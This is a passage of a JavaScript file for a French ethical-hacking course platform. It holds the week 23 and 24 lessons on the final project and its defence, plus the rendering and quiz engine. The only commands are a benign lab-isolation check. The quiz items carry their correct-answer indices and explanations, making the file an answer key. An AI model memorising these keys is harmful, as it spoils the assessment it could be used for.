    { q: "Quelles fonctions du NIST Cybersecurity Framework sont le plus directement mobilisées par un audit de sécurité et ses recommandations ?", options: ["Detect et Respond uniquement", "Identify et Protect", "Recover uniquement", "Aucune fonction du NIST CSF n'est concernée"], correct: 1, explanation: "L'audit vise à identifier les risques (Identify) et à formuler des mesures de protection correctives (Protect), avant même la détection ou la réponse aux incidents." }
  ]
},
{
  id: "S23", week: 23, phase: 4,
  title: "Préparation du projet final",
  level: "expert",
  duration: "Semaine 23 · ~12h",
  intro: "C'est le moment de mobiliser l'ensemble des compétences acquises depuis la semaine 1 : attaque, défense, audit et documentation. Cette semaine encadre la construction d'un projet final complet — un scénario réaliste d'attaque puis de défense sur un environnement que vous aurez vous-même bâti et sécurisé.",
  objectives: [
    "Choisir un scénario de projet final réaliste combinant attaque et défense.",
    "Mettre en place un environnement de test complet et isolé.",
    "Réaliser un audit de sécurité structuré sur cet environnement.",
    "Documenter méthodiquement chaque étape technique réalisée.",
    "Préparer une soutenance claire et argumentée du projet."
  ],
  definition: "Le projet final HACKINÉTIQUE est une mise en situation intégrale mobilisant les compétences des quatre phases du programme : construction d'un scénario réaliste (infrastructure vulnérable), phase offensive (reconnaissance, exploitation), phase défensive (détection, remédiation) et audit final documenté. Cette semaine encadre le choix du scénario, la mise en place de l'environnement, la réalisation de l'audit, la documentation et la préparation de la soutenance.",
  analogy: { title: "🎓 Le projet final comme chef-d'œuvre d'artisan", text: "Dans les corporations de métiers, l'apprenti devenait compagnon en réalisant un « chef-d'œuvre » démontrant seul la maîtrise de toutes les techniques apprises. Le projet final HACKINÉTIQUE joue ce rôle : une réalisation complète, de vos mains, qui prouve la maîtrise du cycle attaque-défense-audit." },
  keyTerms: [
    { term: "Scénario de projet", def: "Mise en situation réaliste définissant l'environnement cible, les objectifs et les contraintes du projet final." },
    { term: "Environnement isolé", def: "Infrastructure de test (VM, réseau virtuel) cloisonnée du réseau de production pour permettre des tests sans risque." },
    { term: "Documentation technique", def: "Trace écrite et reproductible de chaque action réalisée : commandes, captures, résultats, interprétation." },
    { term: "Soutenance", def: "Présentation orale et démonstration du projet devant un jury, incluant questions-réponses." }
  ],
  lesson: [
    { heading: "Choisir un scénario réaliste et mesurable", html: "<p>Un bon scénario de projet final combine trois ingrédients : une <strong>infrastructure vulnérable réaliste</strong> (ex. serveur web avec CMS obsolète, service SSH mal configuré, partage réseau mal protégé), un <strong>objectif offensif clair</strong> (ex. obtenir un accès administrateur), et un <strong>volet défensif</strong> (ex. détecter l'intrusion simulée et produire un rapport de réponse à incident). Exemples de scénarios validés : « Compromission d'un serveur web WordPress puis détection SOC » ou « Exfiltration simulée de données et investigation forensique post-incident ».</p>" },
    { heading: "Mettre en place l'environnement de test", html: "<p>L'environnement doit être entièrement isolé du réseau de production ou personnel, généralement via un hyperviseur local (VirtualBox, VMware) et un réseau interne dédié. Extrait d'une checklist de mise en place minimale :</p><pre><code># Vérification de l'isolement réseau du laboratoire\nip route show   # Aucune route vers le réseau domestique/production\nnmap -sn 192.168.56.0/24   # Confirmer les seules machines du labo présentes</code></pre><p>Chaque machine (cible, attaquant, SIEM) doit être documentée : rôle, adresse IP, services installés.</p>" },
    { heading: "Réaliser l'audit complet du scénario", html: "<p>Le projet final applique la méthodologie complète vue en semaine 22 (PTES) : cadrage, reconnaissance, exploitation, puis analyse défensive avec les outils des semaines 19-21 (SIEM, IDS Snort, forensics). L'objectif est de démontrer la boucle complète : une attaque est menée, elle est détectée (ou non, ce qui est aussi un résultat analysable), puis investiguée.</p>" },
    { heading: "Documenter chaque étape avec rigueur", html: "<p>La documentation doit permettre à un tiers de reproduire exactement la démarche : commandes exactes utilisées, captures d'écran horodatées, résultats obtenus et leur interprétation. Une documentation insuffisante est la première cause de note pénalisée lors des soutenances de projets techniques — même un projet techniquement excellent perd de la valeur s'il n'est pas traçable.</p>" },
    { heading: "Préparer la soutenance", html: "<p>La soutenance doit raconter une histoire claire en trois temps : le contexte et les objectifs, la démarche technique (attaque puis défense/audit), et les résultats avec recommandations. Prévoir une démonstration technique courte et fiable (capture vidéo de secours en cas d'échec live), et anticiper les questions du jury sur les choix méthodologiques et les limites du projet.</p>" }
  ],
  standards: ["PTES — Penetration Testing Execution Standard (structuration globale du projet)", "NIST SP 800-61 — Computer Security Incident Handling Guide (volet défensif du scénario)", "ISO/IEC 27035 — Gestion des incidents de sécurité de l'information"],
  steps: [
    { text: "Choisir un scénario de projet combinant attaque et défense.", color: "green" },
    { text: "Mettre en place l'environnement de test isolé.", color: "green" },
    { text: "Réaliser l'audit complet (offensif puis défensif).", color: "green" },
    { text: "Documenter méthodiquement chaque étape réalisée.", color: "green" },
    { text: "Préparer le support et la démonstration de soutenance.", color: "green" },
    { text: "Livrable : Projet final finalisé.", color: "red" }
  ],
  deliverable: "Un projet final complet : scénario documenté, environnement de test opérationnel, phase offensive et défensive réalisées et tracées, rapport d'audit final, et support de soutenance prêt à être présenté.",
  tp: {
    title: "TP S23 — Construction et documentation du projet final",
    objectif: "Construire l'environnement du projet final, exécuter le scénario attaque/défense choisi et produire l'ensemble des livrables documentaires nécessaires à la soutenance.",
    duree: "6 à 8 heures (réparties sur la semaine)",
    materiel: ["Hyperviseur local (VirtualBox/VMware)", "VM(s) cible(s) vulnérable(s) selon le scénario choisi", "VM attaquante", "Stack SIEM/Snort déployée en semaines 19-20", "Outil de prise de notes/documentation (Markdown, traitement de texte)"],
    consignes: [
      "Rédiger une fiche de scénario : contexte, infrastructure cible, objectif offensif, objectif défensif.",
      "Déployer l'ensemble des machines virtuelles nécessaires sur un réseau interne isolé et vérifié.",
      "Mener la phase offensive planifiée en documentant chaque commande et chaque résultat obtenu.",
      "Activer les outils de détection (SIEM/Snort) et vérifier la remontée (ou l'absence de remontée) des événements liés à l'attaque.",
      "Réaliser, si pertinent au scénario, une phase d'investigation forensique post-incident.",
      "Compiler un rapport final structuré (contexte, méthodologie, résultats, recommandations).",
      "Construire le support de présentation (slides ou document) et répéter une première fois la démonstration technique."
    ],
    livrable: "Dossier de projet complet : fiche de scénario, journal d'exécution documenté, rapport final, support de soutenance.",
    criteres: ["Scénario cohérent, réaliste et clairement défini", "Environnement fonctionnel et correctement isolé", "Documentation complète et reproductible de chaque étape", "Support de soutenance clair et démonstration préparée"]
  },
  quiz: [
    { q: "Quel est le premier ingrédient indispensable d'un bon scénario de projet final ?", options: ["Un budget matériel important", "Une infrastructure vulnérable réaliste avec objectifs offensif et défensif clairs", "L'utilisation exclusive d'outils payants", "L'absence totale de documentation"], correct: 1, explanation: "Un scénario solide combine une infrastructure réaliste, un objectif offensif mesurable et un volet défensif (détection/réponse), condition de sa valeur pédagogique." },
    { q: "Pourquoi l'environnement de test du projet final doit-il être isolé du réseau de production ?", options: ["Pour des raisons esthétiques", "Pour éviter tout impact non maîtrisé sur des systèmes réels", "Ce n'est pas nécessaire si l'attaquant est prudent", "Pour économiser de la bande passante uniquement"], correct: 1, explanation: "L'isolement réseau garantit qu'aucune action offensive du projet ne puisse affecter accidentellement un système réel en dehors du laboratoire." },
    { q: "Quelle est la première cause fréquente de dévalorisation d'un projet techniquement réussi lors d'une soutenance ?", options: ["Un scénario trop simple", "Une documentation insuffisante ou non reproductible", "L'utilisation de Linux plutôt que Windows", "Un projet trop court"], correct: 1, explanation: "Sans documentation rigoureuse et reproductible, même un projet techniquement excellent perd sa valeur car il ne peut être vérifié ni compris par un tiers." },
    { q: "Que doit permettre en priorité la documentation de chaque étape du projet ?", options: ["D'impressionner visuellement le jury", "De permettre à un tiers de reproduire exactement la démarche", "De remplacer la soutenance orale", "De masquer les échecs rencontrés"], correct: 1, explanation: "Une documentation professionnelle vise la reproductibilité : commandes exactes, résultats et interprétation, à l'image d'un rapport d'incident ou d'audit réel." },
    { q: "Pourquoi est-il recommandé de prévoir une capture vidéo de secours pour la démonstration technique de la soutenance ?", options: ["Pour remplacer entièrement la présentation orale", "Pour garantir la continuité de la démonstration en cas d'échec technique en direct", "Ce n'est jamais recommandé en cybersécurité", "Pour respecter une obligation légale"], correct: 1, explanation: "Les démonstrations live peuvent échouer pour des raisons techniques imprévues ; une capture de secours garantit que le travail réalisé reste démontrable devant le jury." }
  ]
},
{
  id: "S24", week: 24, phase: 4,
  title: "Soutenance & clôture",
  level: "expert",
  duration: "Semaine 24 · ~8h",
  intro: "Dernière ligne droite du parcours HACKINÉTIQUE : présenter son projet final devant un jury, défendre ses choix techniques et méthodologiques, recevoir un retour constructif, puis clôturer officiellement 24 semaines de formation avec la remise de l'attestation.",
  objectives: [
    "Présenter clairement et de façon structurée le projet final devant un jury.",
    "Répondre avec assurance et rigueur technique aux questions du jury.",
    "Analyser un retour constructif pour identifier ses axes de progression.",
    "Faire la synthèse transversale des compétences validées sur les 24 semaines du programme.",
    "Clôturer officiellement le parcours et recevoir l'attestation HACKINÉTIQUE."
  ],
  definition: "La soutenance est la présentation orale, argumentée et démontrée du projet final devant un jury évaluateur, suivie d'une session de questions-réponses techniques. Elle valide l'ensemble des compétences acquises sur les quatre phases du programme (fondamentaux, attaque web/réseau, exploitation avancée, défense/professionnalisation) et débouche sur la remise de l'attestation HACKINÉTIQUE, marquant la clôture officielle du parcours.",
  analogy: { title: "🎯 La soutenance comme mission de conseil réelle", text: "Une soutenance ressemble à la restitution finale d'une mission de conseil en cybersécurité : le client (le jury) attend une présentation claire, des preuves tangibles, et sait qu'il posera des questions pièges pour vérifier que la compréhension dépasse la simple exécution de commandes." },
  keyTerms: [
    { term: "Jury", def: "Groupe d'évaluateurs (formateurs, professionnels) chargé d'apprécier la qualité du projet et de la présentation." },
    { term: "Grille d'évaluation", def: "Ensemble de critères objectifs utilisés par le jury pour noter la prestation (fond technique, forme, maîtrise)." },
    { term: "Retour constructif (feedback)", def: "Analyse argumentée des points forts et axes d'amélioration formulée à l'issue d'une évaluation." },
    { term: "Attestation HACKINÉTIQUE", def: "Document officiel délivré par CJEPE-BENIN certifiant la validation des compétences du programme de 24 semaines." }
  ],
  lesson: [
    { heading: "Structurer une présentation de soutenance efficace", html: "<p>Une présentation de 15 à 20 minutes suit généralement une structure éprouvée : <strong>contexte et objectifs</strong> (2 min), <strong>démarche méthodologique</strong> (5 min), <strong>démonstration technique</strong> (5-7 min), <strong>résultats et recommandations</strong> (3 min), puis <strong>conclusion et retour d'expérience</strong> (2 min). Chaque slide doit porter une seule idée forte ; les détails techniques exhaustifs restent dans le rapport écrit, pas dans les slides.</p>" },
    { heading: "Anticiper et répondre aux questions du jury", html: "<p>Les questions de jury portent typiquement sur trois axes : la <strong>justification des choix techniques</strong> (« pourquoi Snort plutôt qu'un autre IDS ? »), les <strong>limites du travail réalisé</strong> (« qu'auriez-vous fait avec plus de temps ? ») et la <strong>compréhension conceptuelle</strong> au-delà de l'exécution (« que se passerait-il si l'attaquant chiffrait son trafic ? »). Une bonne réponse reconnaît honnêtement les limites plutôt que de les dissimuler — un candidat qui admet une limite argumentée inspire davantage confiance qu'un candidat qui prétend à la perfection.</p>" },
    { heading: "Exploiter le retour constructif du jury", html: "<p>Le feedback du jury doit être noté et analysé, pas seulement écouté. Exemple de grille d'auto-évaluation post-soutenance :</p><pre><code>Grille d'auto-évaluation post-soutenance\n--------------------------------------\n[ ] Clarté du contexte et des objectifs présentés\n[ ] Rigueur de la démarche méthodologique (PTES respecté)\n[ ] Fiabilité de la démonstration technique\n[ ] Pertinence des recommandations formulées\n[ ] Qualité des réponses aux questions techniques\n[ ] Gestion du temps de présentation</code></pre><p>Ce type de grille, utilisée également en amont comme outil de répétition, permet d'objectiver sa propre progression.</p>" },
    { heading: "Synthèse transversale des 24 semaines du programme", html: "<p>Le parcours HACKINÉTIQUE relie quatre grandes compétences professionnelles : la maîtrise d'un environnement technique (Phase 1), la capacité à identifier et exploiter des vulnérabilités web et réseau dans un cadre légal (Phase 2 et 3), et la capacité à détecter, investiguer et défendre un système d'information (Phase 4). Cette boucle complète attaque-défense-audit-documentation est précisément ce qu'attendent les référentiels professionnels comme le NIST CSF (couvrant Identify, Protect, Detect, Respond, Recover) et les certifications CompTIA (Security+, PenTest+, CySA+).</p>" },
    { heading: "Clôture officielle et remise de l'attestation", html: "<p>La remise de l'attestation HACKINÉTIQUE marque la fin formelle du programme, mais aussi le début d'un parcours professionnel continu : veille technique (CVE, MITRE ATT&CK), pratique régulière (CTF, plateformes de labs), et poursuite éventuelle vers des certifications reconnues (CompTIA Security+/PenTest+/CySA+, eJPT, OSCP). L'éthique professionnelle — autorisation écrite systématique, respect du périmètre, confidentialité des données clients — reste le socle non négociable de toute pratique future du métier.</p>" }
  ],
  standards: ["NIST Cybersecurity Framework — synthèse des cinq fonctions (Identify, Protect, Detect, Respond, Recover)", "CompTIA Security+ / PenTest+ / CySA+ — référentiels de certification professionnelle de suite de parcours", "PTES — Penetration Testing Execution Standard (rappel de la structure globale du métier)"],
  steps: [
    { text: "Présenter le projet final devant le jury.", color: "green" },
    { text: "Répondre aux questions techniques et méthodologiques du jury.", color: "green" },
    { text: "Recevoir et analyser les retours constructifs du jury.", color: "green" },
    { text: "Valider l'ensemble des compétences du programme.", color: "green" },
    { text: "Recevoir l'attestation officielle HACKINÉTIQUE.", color: "green" },
    { text: "Livrable : Attestation HACKINÉTIQUE.", color: "red" }
  ],
  deliverable: "Une soutenance réalisée devant jury avec démonstration technique fonctionnelle, une grille d'auto-évaluation complétée à partir du retour du jury, et l'obtention de l'attestation HACKINÉTIQUE.",
  tp: {
    title: "TP S24 — Répétition générale et simulation de soutenance",
    objectif: "Répéter la présentation du projet final dans des conditions proches du réel, s'auto-évaluer avec une grille objective, et ajuster la prestation avant la soutenance officielle.",
    duree: "2 à 3 heures",
    materiel: ["Support de présentation finalisé (slides ou document)", "Environnement de démonstration du projet final opérationnel", "Grille d'auto-évaluation post-soutenance", "Un pair ou un mentor pour jouer le rôle du jury (facultatif mais recommandé)"],
    consignes: [
      "Chronométrer une répétition complète de la présentation (contexte, démarche, démonstration, résultats, conclusion).",
      "Exécuter la démonstration technique en conditions réelles pour vérifier sa fiabilité, et préparer une capture vidéo de secours.",
      "Lister par écrit cinq questions probables du jury et préparer une réponse argumentée à chacune.",
      "Faire rejouer la soutenance devant un pair ou mentor jouant le rôle du jury, si possible.",
      "Compléter la grille d'auto-évaluation immédiatement après la répétition, sans complaisance.",
      "Identifier les deux ou trois points faibles prioritaires et les retravailler avant la soutenance officielle.",
      "Vérifier l'ensemble des livrables du dossier de projet final (rapport, documentation, support) avant le jour J."
    ],
    livrable: "Grille d'auto-évaluation complétée + liste des questions anticipées avec réponses préparées + support de présentation finalisé.",
    criteres: ["Présentation respectant le minutage cible", "Démonstration technique fiable ou solution de secours prête", "Grille d'auto-évaluation complétée avec honnêteté", "Réponses préparées aux questions techniques anticipées"]
  },
  quiz: [
    { q: "Quelle fonction du NIST Cybersecurity Framework couvre la mise en place d'un SIEM et d'un IDS comme Snort ?", options: ["Identify", "Protect", "Detect", "Recover"], correct: 2, explanation: "La fonction Detect (DE) du NIST CSF couvre la surveillance continue et les mécanismes de détection tels que le SIEM (S19) et l'IDS Snort (S20)." },
    { q: "Quelle norme encadre spécifiquement la préservation des preuves numériques lors d'une investigation forensique ?", options: ["ISO/IEC 27001", "ISO/IEC 27037", "PTES", "CVSS"], correct: 1, explanation: "ISO/IEC 27037, vue en semaine 21, définit les lignes directrices d'identification, de collecte et de préservation des preuves numériques." },
    { q: "Sur quel standard s'appuie la structuration d'un rapport d'audit de sécurité professionnel étudiée en semaine 22 ?", options: ["MITRE ATT&CK", "PTES — Penetration Testing Execution Standard", "OSI", "RFC 1918"], correct: 1, explanation: "Le PTES structure l'ensemble d'un audit en sept phases, de la préparation jusqu'au rapport final, socle méthodologique du métier d'auditeur." },
    { q: "Quelle attitude est recommandée face à une question du jury portant sur une limite réelle du projet final ?", options: ["Nier la limite et changer de sujet", "Reconnaître honnêtement la limite et l'argumenter", "Refuser de répondre", "Rejeter la responsabilité sur le matériel utilisé"], correct: 1, explanation: "Reconnaître une limite avec un argumentaire solide démontre une compréhension mature du sujet et inspire davantage confiance qu'une posture défensive." },
    { q: "Quel principe reste le socle non négociable de toute pratique professionnelle après l'obtention de l'attestation HACKINÉTIQUE ?", options: ["L'usage exclusif d'outils gratuits", "L'autorisation écrite systématique et le respect strict du périmètre autorisé", "Le travail en solitaire uniquement", "L'absence de documentation pour aller plus vite"], correct: 1, explanation: "Quel que soit l'outil ou la mission, l'autorisation écrite préalable et le respect du périmètre défini restent la ligne rouge légale et éthique de toute activité de sécurité offensive ou défensive." }
  ]
}
];

// Fusionne les 4 phases en un seul tableau exploité par l'application
const COURSE_DATA = [].concat(PHASE1, PHASE2, PHASE3, PHASE4);

/* ==========================================================================
   HACKINÉTIQUE — Moteur de la plateforme de cours (cours.html)
   ========================================================================== */

const STORAGE_KEY = "hackinetique_progress_v1";
const QUIZ_KEY = "hackinetique_quiz_v1";

// Le contenu pédagogique aborde des payloads (XSS, injections...) qui peuvent
// contenir < > & littéraux : tout champ "texte" (hors HTML de leçon volontaire)
// doit être échappé avant insertion via innerHTML pour ne pas casser le DOM
// ni exécuter de balises injectées.
function esc(str) {
  return String(str == null ? "" : str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

const PHASE_META = {
  1: { title: "Fondamentaux & Sécurité Web", range: "Semaines 1 à 6", cls: "p1" },
  2: { title: "Réseaux & Systèmes", range: "Semaines 7 à 12", cls: "p2" },
  3: { title: "Outils de Cybersécurité", range: "Semaines 13 à 18", cls: "p3" },
  4: { title: "Défense & Professionnalisation", range: "Semaines 19 à 24", cls: "p4" }
};

function loadProgress() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {}; }
  catch (e) { return {}; }
}
function saveProgress(data) { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); }

function loadQuizState() {
  try { return JSON.parse(localStorage.getItem(QUIZ_KEY)) || {}; }
  catch (e) { return {}; }
}
function saveQuizState(data) { localStorage.setItem(QUIZ_KEY, JSON.stringify(data)); }

let progress = loadProgress();
let quizState = loadQuizState();
let currentWeekId = null;
let currentTab = "lecon";

function getWeekData(id) { return COURSE_DATA.find(w => w.id === id); }

function toast(msg) {
  const t = document.getElementById("toast");
  if (!t) return;
  t.textContent = msg;
  t.classList.add("show");
  clearTimeout(t._timer);
  t._timer = setTimeout(() => t.classList.remove("show"), 2200);
}

/* ---------------- Sidebar ---------------- */
function renderSidebar(filter) {
  const container = document.getElementById("sidebarList");
  container.innerHTML = "";
  const query = (filter || "").trim().toLowerCase();

  [1, 2, 3, 4].forEach(phaseNum => {
    const weeks = COURSE_DATA.filter(w => w.phase === phaseNum &&
      (!query || w.title.toLowerCase().includes(query) || w.id.toLowerCase().includes(query)));
    if (query && weeks.length === 0) return;

    const meta = PHASE_META[phaseNum];
    const group = document.createElement("div");
    group.className = "phase-group " + meta.cls;

    const header = document.createElement("button");
    header.className = "phase-group-header";
    header.innerHTML = `<span>${phaseNum.toString().padStart(2,"0")} · ${meta.title}</span><span class="chev">▾</span>`;
    header.addEventListener("click", () => {
      const list = group.querySelector(".week-list");
      list.classList.toggle("collapsed");
      header.classList.toggle("collapsed");
    });
    group.appendChild(header);

    const list = document.createElement("ul");
    list.className = "week-list";

    weeks.forEach(w => {
      const li = document.createElement("li");
      const btn = document.createElement("button");
      const done = !!(progress[w.id] && progress[w.id].done);
      btn.className = "week-link" + (w.id === currentWeekId ? " active" : "") + (done ? " done" : "");
      btn.innerHTML = `<span class="check">${done ? "✓" : ""}</span><span>${esc(w.id)} — ${esc(w.title)}</span>`;
      btn.addEventListener("click", () => selectWeek(w.id));
      li.appendChild(btn);
      list.appendChild(li);
    });

    group.appendChild(list);
    container.appendChild(group);
  });

  updateGlobalProgress();
}

function updateGlobalProgress() {
  const total = COURSE_DATA.length;
  const done = COURSE_DATA.filter(w => progress[w.id] && progress[w.id].done).length;
  const pct = total ? Math.round((done / total) * 100) : 0;
  const bar = document.getElementById("progressBar");
  const label = document.getElementById("progressLabel");
  if (bar) bar.style.width = pct + "%";
  if (label) label.textContent = `${done}/${total} semaines · ${pct}%`;
}

/* ---------------- Main panel ---------------- */
// index.html est une page unique : la section #cours contient l'application.
// On ne défile jusqu'à elle que lors d'une navigation explicite (clic), jamais
// au chargement initial, pour ne pas éjecter l'utilisateur hors de la page d'accueil.
function selectWeek(id, opts) {
  opts = opts || {};
  currentWeekId = id;
  currentTab = "lecon";
  localStorage.setItem("hackinetique_last_week", id);
  renderMain();
  renderSidebar(document.getElementById("searchInput").value);
  if (opts.scroll !== false) {
    const coursSection = document.getElementById("cours");
    if (coursSection) coursSection.scrollIntoView({ behavior: "smooth", block: "start" });
  }
  const params = new URLSearchParams(window.location.search);
  params.set("s", id);
  history.replaceState(null, "", "?" + params.toString());
}

function renderMain() {
  const panel = document.getElementById("mainPanel");
  const w = getWeekData(currentWeekId);
  if (!w) {
    panel.innerHTML = `<div class="empty-state"><h2>Sélectionnez une semaine</h2><p>Choisissez un module dans le menu latéral pour commencer.</p></div>`;
    return;
  }
  const done = !!(progress[w.id] && progress[w.id].done);
  const idx = COURSE_DATA.findIndex(x => x.id === w.id);
  const prev = COURSE_DATA[idx - 1];
  const next = COURSE_DATA[idx + 1];

  panel.innerHTML = `
    <div class="week-hero">
      <div class="tag-row">
        <span class="badge-level level-${w.level}">${levelLabel(w.level)}</span>
        <span class="pill pill-orange">${esc(w.duration)}</span>
        <span class="pill pill-blue" style="background:rgba(255,255,255,0.18); color:#fff;">Phase ${w.phase} · ${esc(PHASE_META[w.phase].title)}</span>
      </div>
      <h1>${esc(w.id)} — ${esc(w.title)}</h1>
      <p>${esc(w.intro || "")}</p>
    </div>

    <div class="tabs">
      <button class="tab-btn" data-tab="lecon">📖 Leçon</button>
      <button class="tab-btn" data-tab="tp">🧪 TP Pratique</button>
      <button class="tab-btn" data-tab="quiz">📝 Quiz</button>
    </div>

    <div id="tab-lecon" class="tab-panel"></div>
    <div id="tab-tp" class="tab-panel"></div>
    <div id="tab-quiz" class="tab-panel"></div>

    <div class="week-nav">
      <button class="btn btn-ghost" id="prevBtn" ${prev ? "" : "disabled"}>← ${esc(prev ? prev.id : "Début")}</button>
      <button class="btn ${done ? "btn-ghost" : "btn-navy"}" id="markDoneBtn">${done ? "✓ Semaine validée" : "Marquer comme terminée"}</button>
      <button class="btn btn-orange" id="nextBtn" ${next ? "" : "disabled"}>${esc(next ? next.id : "Fin")} →</button>
    </div>
  `;

  document.getElementById("tab-lecon").innerHTML = renderLesson(w);
  document.getElementById("tab-tp").innerHTML = renderTP(w);
  document.getElementById("tab-quiz").innerHTML = renderQuiz(w);

  panel.querySelectorAll(".tab-btn").forEach(btn => {
    btn.addEventListener("click", () => setTab(btn.dataset.tab));
  });
  setTab(currentTab);

  document.getElementById("prevBtn").addEventListener("click", () => prev && selectWeek(prev.id));
  document.getElementById("nextBtn").addEventListener("click", () => next && selectWeek(next.id));
  document.getElementById("markDoneBtn").addEventListener("click", () => {
    progress[w.id] = progress[w.id] || {};
    progress[w.id].done = !progress[w.id].done;
    saveProgress(progress);
    toast(progress[w.id].done ? `${w.id} marquée comme terminée !` : `${w.id} remise en cours.`);
    renderMain();
    renderSidebar(document.getElementById("searchInput").value);
  });

  wireTPChecklist(w);
  wireQuiz(w);
}

function setTab(tab) {
  currentTab = tab;
  document.querySelectorAll(".tab-btn").forEach(b => b.classList.toggle("active", b.dataset.tab === tab));
  document.querySelectorAll(".tab-panel").forEach(p => p.classList.remove("active"));
  const el = document.getElementById("tab-" + tab);
  if (el) el.classList.add("active");
}

function levelLabel(level) {
  return { debutant: "Débutant", intermediaire: "Intermédiaire", avance: "Avancé", expert: "Expert" }[level] || level;
}

/* ---------------- Lesson tab ---------------- */
function renderLesson(w) {
  let html = `<div class="lesson-block">
    <h3>🎯 Objectifs pédagogiques</h3>
    <ul class="objectives-list">${(w.objectives || []).map(o => `<li>${esc(o)}</li>`).join("")}</ul>
  </div>`;

  if (w.definition) {
    html += `<div class="lesson-block"><div class="definition-box"><strong>Définition :</strong> ${esc(w.definition)}</div>`;
    if (w.analogy) {
      html += `<div class="analogy-box"><strong>${esc(w.analogy.title)}</strong><br>${esc(w.analogy.text)}</div>`;
    }
    if (w.keyTerms && w.keyTerms.length) {
      html += `<h4>📚 Glossaire de la semaine</h4><div class="key-terms">${w.keyTerms.map(t => `<div class="key-term"><strong>${esc(t.term)}</strong><span>${esc(t.def)}</span></div>`).join("")}</div>`;
    }
    html += `</div>`;
  }

  (w.lesson || []).forEach(section => {
    html += `<div class="lesson-block"><h3>${esc(section.heading)}</h3>${section.html}</div>`;
  });

  if (w.standards && w.standards.length) {
    html += `<div class="lesson-block"><div class="standards-box"><h4>🌍 Normes & référentiels internationaux</h4><ul>${w.standards.map(s => `<li>${esc(s)}</li>`).join("")}</ul></div></div>`;
  }

  if (w.steps && w.steps.length) {
    html += `<div class="lesson-block"><h3>📋 Étapes de la semaine</h3>${w.steps.map((s, i) => `<div class="step-item"><span class="step-number ${s.color || "blue"}">${i + 1}</span><span>${esc(s.text)}</span></div>`).join("")}</div>`;
  }

  if (w.deliverable) {
    html += `<div class="lesson-block"><h3>📦 Livrable attendu</h3><div class="tp-deliverable">${esc(w.deliverable)}</div></div>`;
  }

  return html;
}

/* ---------------- TP tab ---------------- */
function renderTP(w) {
  const tp = w.tp;
  if (!tp) return `<div class="empty-state">Aucun TP défini pour cette semaine.</div>`;
  const savedChecks = (progress[w.id] && progress[w.id].tpChecks) || [];

  return `<div class="tp-box">
    <div class="tp-header">
      <h3>${esc(tp.title)}</h3>
      <p>${esc(tp.objectif)}${tp.duree ? " · ⏱ " + esc(tp.duree) : ""}</p>
    </div>
    <div class="tp-body">
      ${tp.materiel && tp.materiel.length ? `<h4>🧰 Matériel nécessaire</h4><ul>${tp.materiel.map(m => `<li>${esc(m)}</li>`).join("")}</ul>` : ""}
      <h4>✅ Consignes (cochez au fur et à mesure)</h4>
      <ul class="tp-checklist">
        ${tp.consignes.map((c, i) => `<li class="${savedChecks.includes(i) ? "checked" : ""}"><input type="checkbox" data-idx="${i}" ${savedChecks.includes(i) ? "checked" : ""}><span>${esc(c)}</span></li>`).join("")}
      </ul>
      ${tp.livrable ? `<h4>📦 Livrable</h4><div class="tp-deliverable">${esc(tp.livrable)}</div>` : ""}
      ${tp.criteres && tp.criteres.length ? `<h4>🏆 Critères d'évaluation</h4><ul class="tp-criteria">${tp.criteres.map(c => `<li>${esc(c)}</li>`).join("")}</ul>` : ""}
    </div>
  </div>`;
}

function wireTPChecklist(w) {
  const tp = w.tp;
  if (!tp) return;
  document.querySelectorAll("#tab-tp .tp-checklist input[type=checkbox]").forEach(cb => {
    cb.addEventListener("change", () => {
      progress[w.id] = progress[w.id] || {};
      const checks = new Set(progress[w.id].tpChecks || []);
      const idx = parseInt(cb.dataset.idx, 10);
      if (cb.checked) checks.add(idx); else checks.delete(idx);
      progress[w.id].tpChecks = Array.from(checks);
      saveProgress(progress);
      cb.closest("li").classList.toggle("checked", cb.checked);
      if (progress[w.id].tpChecks.length === tp.consignes.length) {
        toast("TP complet — pense à valider la semaine !");
      }
    });
  });
}

/* ---------------- Quiz tab ---------------- */
function renderQuiz(w) {
  if (!w.quiz || !w.quiz.length) return `<div class="empty-state">Aucun quiz défini pour cette semaine.</div>`;
  const state = quizState[w.id] || { answers: {}, submitted: false };

  const questions = w.quiz.map((q, qi) => `
    <div class="quiz-question" data-qi="${qi}">
      <div class="q-title">${qi + 1}. ${esc(q.q)}</div>
      <div class="quiz-options">
        ${q.options.map((opt, oi) => `
          <label class="quiz-option" data-oi="${oi}">
            <input type="radio" name="q${qi}" value="${oi}" ${state.answers[qi] === oi ? "checked" : ""}>
            <span>${esc(opt)}</span>
          </label>
        `).join("")}
      </div>
      <div class="quiz-explain" data-explain="${qi}">${esc(q.explanation)}</div>
    </div>
  `).join("");

  return `<div class="quiz-box">
    <div class="quiz-header">
      <div><h3>Quiz de validation — ${esc(w.id)}</h3><p>${w.quiz.length} questions · norme de réussite : 70%</p></div>
    </div>
    <div class="quiz-body">${questions}</div>
    <div class="quiz-footer">
      <span class="quiz-score" id="quizScore">${state.submitted ? scoreLabel(w) : "Pas encore soumis"}</span>
      <div style="display:flex; gap:0.6rem;">
        <button class="btn btn-ghost" id="quizReset">Réinitialiser</button>
        <button class="btn btn-orange" id="quizSubmit">Valider mes réponses</button>
      </div>
    </div>
  </div>`;
}

function scoreLabel(w) {
  const state = quizState[w.id];
  if (!state || !state.submitted) return "Pas encore soumis";
  const total = w.quiz.length;
  const correct = w.quiz.filter((q, i) => state.answers[i] === q.correct).length;
  const pct = Math.round((correct / total) * 100);
  return `Score : ${correct}/${total} (${pct}%)`;
}

function wireQuiz(w) {
  if (!w.quiz || !w.quiz.length) return;
  quizState[w.id] = quizState[w.id] || { answers: {}, submitted: false };
  const state = quizState[w.id];

  document.querySelectorAll("#tab-quiz .quiz-option input").forEach(input => {
    input.addEventListener("change", () => {
      const qi = parseInt(input.closest(".quiz-question").dataset.qi, 10);
      const oi = parseInt(input.value, 10);
      state.answers[qi] = oi;
      saveQuizState(quizState);
      if (state.submitted) applyQuizFeedback(w);
    });
  });

  document.getElementById("quizSubmit").addEventListener("click", () => {
    if (Object.keys(state.answers).length < w.quiz.length) {
      toast("Répondez à toutes les questions avant de valider.");
      return;
    }
    state.submitted = true;
    saveQuizState(quizState);
    applyQuizFeedback(w);
    const total = w.quiz.length;
    const correct = w.quiz.filter((q, i) => state.answers[i] === q.correct).length;
    const pct = Math.round((correct / total) * 100);
    document.getElementById("quizScore").textContent = scoreLabel(w);
